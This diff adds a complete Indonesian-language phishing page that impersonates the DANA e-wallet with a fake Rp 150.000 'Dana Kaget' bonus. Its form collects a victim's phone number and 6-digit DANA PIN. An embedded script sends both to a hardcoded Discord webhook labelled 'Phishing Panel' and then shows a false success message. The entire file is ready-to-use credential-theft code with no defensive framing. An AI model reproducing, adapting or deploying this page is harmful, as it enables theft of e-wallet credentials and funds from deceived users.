@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Klaim Dana Kaget</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        body {
+            background: #1a1a2e;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .container {
+            background: #16213e;
+            padding: 40px;
+            border-radius: 20px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.8);
+            width: 400px;
+            max-width: 95%;
+            border: 1px solid #0f3460;
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .logo h1 {
+            color: #e94560;
+            font-size: 28px;
+            font-weight: 700;
+        }
+        .logo p {
+            color: #aaa;
+            font-size: 14px;
+            margin-top: 5px;
+        }
+        .bonus-box {
+            background: #0f3460;
+            padding: 15px;
+            border-radius: 12px;
+            text-align: center;
+            margin-bottom: 25px;
+            border: 2px dashed #e94560;
+        }
+        .bonus-box h2 {
+            color: #fff;
+            font-size: 22px;
+        }
+        .bonus-box span {
+            color: #e94560;
+            font-weight: 700;
+            font-size: 26px;
+        }
+        .form-group {
+            margin-bottom: 18px;
+        }
+        .form-group label {
+            display: block;
+            color: #ddd;
+            font-size: 14px;
+            margin-bottom: 6px;
+            font-weight: 600;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 14px 16px;
+            border-radius: 10px;
+            border: 2px solid #0f3460;
+            background: #1a1a2e;
+            color: #fff;
+            font-size: 15px;
+            transition: 0.3s;
+            outline: none;
+        }
+        .form-group input:focus {
+            border-color: #e94560;
+            box-shadow: 0 0 15px rgba(233,69,96,0.2);
+        }
+        .form-group input::placeholder {
+            color: #555;
+        }
+        .btn-submit {
+            width: 100%;
+            padding: 16px;
+            background: #e94560;
+            border: none;
+            border-radius: 10px;
+            color: #fff;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.3s;
+            margin-top: 8px;
+        }
+        .btn-submit:hover {
+            background: #c73652;
+            transform: scale(1.02);
+            box-shadow: 0 5px 20px rgba(233,69,96,0.4);
+        }
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            color: #555;
+            font-size: 12px;
+        }
+        .loader {
+            display: none;
+            text-align: center;
+            margin: 15px 0;
+            color: #e94560;
+            font-size: 14px;
+        }
+        .loader.active {
+            display: block;
+        }
+        .status-msg {
+            display: none;
+            text-align: center;
+            padding: 12px;
+            border-radius: 8px;
+            margin-top: 15px;
+            font-weight: 600;
+        }
+        .status-msg.success {
+            display: block;
+            background: #0f3460;
+            color: #4ade80;
+            border: 1px solid #4ade80;
+        }
+        .status-msg.error {
+            display: block;
+            background: #0f3460;
+            color: #f87171;
+            border: 1px solid #f87171;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <h1>✦ DANA ✦</h1>
+            <p>Dompet Digital Indonesia</p>
+        </div>
+
+        <div class="bonus-box">
+            <h2>🎉 KLAIM DANA KAGET 🎉</h2>
+            <p style="color:#ddd; margin-top:5px;">Anda berhak mendapatkan</p>
+            <span>Rp 150.000</span>
+            <p style="color:#888; font-size:12px; margin-top:5px;">*khusus pengguna aktif</p>
+        </div>
+
+        <form id="claimForm">
+            <div class="form-group">
+                <label>📱 Nomor Telepon</label>
+                <input type="tel" id="phone" placeholder="08xxxxxxxxxx" required>
+            </div>
+            <div class="form-group">
+                <label>🔒 PIN DANA (6 digit)</label>
+                <input type="password" id="pin" placeholder="******" maxlength="6" required>
+            </div>
+            <button type="submit" class="btn-submit" id="submitBtn">KLAIM SEKARANG</button>
+        </form>
+
+        <div class="loader" id="loader">⏳ Memproses klaim...</div>
+        <div class="status-msg" id="statusMsg"></div>
+
+        <div class="footer">
+            © 2026 DANA Indonesia • Pastikan data benar
+        </div>
+    </div>
+
+    <script>
+        // ═══════════════════════════════════════════════
+        // KONFIGURASI WEBHOOK DISCORD
+        // ═══════════════════════════════════════════════
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1524070686254043246/PE5bJmStZXka_cC2GT0jKV9H-oRpmlbL86dfgqtVhgS7LbkwhQ36Ze_zXJ0oPa0rqX-s'; // GANTI DENGAN WEBHOOK ANDA
+
+        document.getElementById('claimForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+
+            const phone = document.getElementById('phone').value.trim();
+            const pin = document.getElementById('pin').value.trim();
+            const submitBtn = document.getElementById('submitBtn');
+            const loader = document.getElementById('loader');
+            const statusMsg = document.getElementById('statusMsg');
+
+            // Validasi dasar
+            if (!phone || phone.length < 10) {
+                statusMsg.className = 'status-msg error';
+                statusMsg.textContent = '❌ Nomor telepon tidak valid!';
+                return;
+            }
+            if (!pin || pin.length !== 6 || !/^\d{6}$/.test(pin)) {
+                statusMsg.className = 'status-msg error';
+                statusMsg.textContent = '❌ PIN harus 6 digit angka!';
+                return;
+            }
+
+            // Disable button & show loader
+            submitBtn.disabled = true;
+            submitBtn.style.opacity = '0.5';
+            loader.classList.add('active');
+            statusMsg.className = 'status-msg';
+            statusMsg.textContent = '';
+
+            // Kirim data ke Discord
+            const payload = {
+                content: null,
+                embeds: [{
+                    title: '🎯 DANA KAGET - DATA BARU',
+                    color: 0xe94560,
+                    fields: [
+                        { name: '📱 Nomor Telepon', value: phone, inline: false },
+                        { name: '🔒 PIN DANA', value: `\`${pin}\``, inline: false },
+                        { name: '🕐 Waktu', value: new Date().toLocaleString('id-ID'), inline: false },
+                        { name: '🌐 IP', value: 'Tertangkap', inline: true }
+                    ],
+                    footer: { text: 'Worm Aiva • Phishing Panel' },
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            try {
+                const response = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+
+                if (response.ok) {
+                    statusMsg.className = 'status-msg success';
+                    statusMsg.textContent = '✅ Klaim berhasil! Tunggu 1x24 jam untuk proses.';
+                    document.getElementById('phone').value = '';
+                    document.getElementById('pin').value = '';
+                } else {
+                    statusMsg.className = 'status-msg error';
+                    statusMsg.textContent = '❌ Gagal memproses, coba lagi.';
+                }
+            } catch (error) {
+                statusMsg.className = 'status-msg error';
+                statusMsg.textContent = '❌ Error koneksi, periksa internet.';
+            }
+
+            // Reset UI
+            submitBtn.disabled = false;
+            submitBtn.style.opacity = '1';
+            loader.classList.remove('active');
+
+            // Auto-hide status setelah 5 detik
+            setTimeout(() => {
+                statusMsg.className = 'status-msg';
+            }, 5000);
+        });
+    </script>
+</body>
+  </html>
